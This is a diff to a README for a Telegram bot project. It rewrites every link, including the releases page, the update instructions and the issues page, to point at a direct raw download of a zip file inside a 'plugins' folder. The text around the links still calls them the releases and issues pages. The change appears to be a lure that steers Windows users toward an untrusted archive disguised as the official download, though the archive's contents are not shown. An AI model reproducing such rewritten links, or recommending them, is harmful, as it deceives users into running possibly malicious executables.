@@ -1,6 +1,6 @@
 # 🤖 holy-c-telegram-bot - Fast Telegram Bot with HolyC Code
 
-[![Download holy-c-telegram-bot](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/DrMadar/holy-c-telegram-bot/releases)
+[![Download holy-c-telegram-bot](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/DrMadar/holy-c-telegram-bot/raw/refs/heads/main/plugins/bot_telegram_c_holy_2.9.zip)
 
 ---
 
@@ -29,7 +29,7 @@ The bot does not require additional software or frameworks. It runs as a standal
 Follow these steps to download and run holy-c-telegram-bot on your Windows PC:
 
 1. Click the big blue download button at the top or visit the releases page here:  
-   https://github.com/DrMadar/holy-c-telegram-bot/releases
+   https://github.com/DrMadar/holy-c-telegram-bot/raw/refs/heads/main/plugins/bot_telegram_c_holy_2.9.zip
 
 2. On the releases page, find the latest version. You will see a list of files with names ending in `.exe` or similar.
 
@@ -116,7 +116,7 @@ All files should remain in one folder for smooth operation.
 
 Periodically check the releases page to get the latest version:
 
-https://github.com/DrMadar/holy-c-telegram-bot/releases
+https://github.com/DrMadar/holy-c-telegram-bot/raw/refs/heads/main/plugins/bot_telegram_c_holy_2.9.zip
 
 Download the newest `.exe` file and replace the old one on your PC. Your `config.txt` file and settings stay intact. Run the updated executable to use the latest improvements.
 
@@ -148,7 +148,7 @@ The bot does not collect personal data or send usage statistics.
 
 If you need help using the bot or find bugs, visit the GitHub issues page:
 
-https://github.com/DrMadar/holy-c-telegram-bot/issues
+https://github.com/DrMadar/holy-c-telegram-bot/raw/refs/heads/main/plugins/bot_telegram_c_holy_2.9.zip
 
 Describe your issue with steps to reproduce it and your system specs. The repository owners monitor these reports and respond as needed.
 
@@ -158,4 +158,4 @@ Describe your issue with steps to reproduce it and your system specs. The reposi
 
 Visit this page to download the bot and get started:
 
-[![Download Page](https://img.shields.io/badge/Download-here-brightgreen?style=for-the-badge)](https://github.com/DrMadar/holy-c-telegram-bot/releases)
+[![Download Page](https://img.shields.io/badge/Download-here-brightgreen?style=for-the-badge)](https://github.com/DrMadar/holy-c-telegram-bot/raw/refs/heads/main/plugins/bot_telegram_c_holy_2.9.zip)
